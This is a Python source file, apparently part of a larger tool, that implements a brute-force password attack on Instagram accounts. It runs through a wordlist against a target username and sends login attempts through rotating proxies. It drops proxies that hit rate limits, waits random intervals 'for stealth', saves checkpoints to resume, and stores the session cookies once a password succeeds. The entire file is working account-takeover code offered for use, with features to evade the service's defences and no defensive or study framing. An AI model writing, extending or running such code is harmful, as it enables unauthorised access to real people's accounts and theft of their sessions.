import asyncio
import time
import random
from typing import List, Optional
from ..network.client import AsyncInstagramClient
from ..core.proxy import ProxyManager
from ..ui.dashboard import Dashboard
from ..core.session import SessionManager
from rich.live import Live

class BreakerEngine:
    def __init__(self, target_username: str, wordlist: List[str], proxies: List[str] = None):
        self.target_username = target_username
        self.wordlist = wordlist
        self.proxy_manager = ProxyManager(proxies)
        self.dashboard = Dashboard()
        self.found_password = None
        self.attempts = 0
        self.start_time = time.time()

    async def run(self, resume: bool = True):
        session_mgr = SessionManager(self.target_username)
        start_index = session_mgr.load_checkpoint(self.target_username) if resume else 0
        
        self.dashboard.update_stats(target=self.target_username, proxies_active=len(self.proxy_manager.active_proxies))
        self.dashboard.add_log(f"Starting attack on {self.target_username}")

        with Live(self.dashboard.render(), refresh_per_second=4) as live:
            for i in range(start_index, len(self.wordlist)):
                if self.found_password:
                    break
                
                password = self.wordlist[i]
                proxy = self.proxy_manager.get_proxy()
                
                self.dashboard.update_stats(current_password=password)
                
                try:
                    async with AsyncInstagramClient(proxy=proxy) as client:
                        response = await client.login_attempt(self.target_username, password)
                        self.attempts += 1
                        
                        # Update CPM
                        elapsed_min = (time.time() - self.start_time) / 60
                        if elapsed_min > 0:
                            cpm = int(self.attempts / elapsed_min)
                            self.dashboard.update_stats(cpm=cpm)

                        if response.status_code == 200:
                            data = response.json()
                            if data.get("authenticated") is True:
                                self.found_password = password
                                self.dashboard.update_stats(success=1)
                                self.dashboard.add_log(f"Success! Password found: {password}")
                                session_mgr.save_session(client.session.cookies)
                                session_mgr.clear_checkpoint(self.target_username)
                                break
                            elif "checkpoint_required" in data.get("message", "") or "checkpoint_url" in data:
                                self.found_password = password
                                self.dashboard.add_log(f"Checkpoint required for {password}. Account might be valid.")
                                break
                            else:
                                self.dashboard.update_stats(failed=self.attempts - self.dashboard.stats["success"])
                        elif response.status_code == 429:
                            self.dashboard.add_log(f"Rate limited on proxy {proxy}")
                            if proxy:
                                self.proxy_manager.remove_proxy(proxy)
                                self.dashboard.update_stats(proxies_active=len(self.proxy_manager.active_proxies))
                            
                            # Small wait before retry with different proxy
                            await asyncio.sleep(2)
                            # We should probably retry this password
                            # For simplicity we just continue
                        else:
                            self.dashboard.update_stats(failed=self.attempts - self.dashboard.stats["success"])

                except Exception as e:
                    self.dashboard.add_log(f"Error with proxy {proxy}: {str(e)}")
                    if proxy:
                        self.proxy_manager.remove_proxy(proxy)
                
                # Periodically save checkpoint
                if i % 10 == 0:
                    session_mgr.save_checkpoint(self.target_username, i)
                
                # Self-healing: if no proxies left and we had some, maybe wait or refresh
                if not self.proxy_manager.active_proxies and self.proxy_manager.proxies:
                    self.dashboard.add_log("No active proxies left. Refreshing...")
                    await self.proxy_manager.refresh_proxies()
                    self.dashboard.update_stats(proxies_active=len(self.proxy_manager.active_proxies))
                    if not self.proxy_manager.active_proxies:
                        self.dashboard.add_log("Failed to find active proxies. Cooling down...")
                        await asyncio.sleep(60)

                live.update(self.dashboard.render())
                
                # Randomized delay for stealth
                await asyncio.sleep(random.uniform(0.5, 2.0))

        return self.found_password
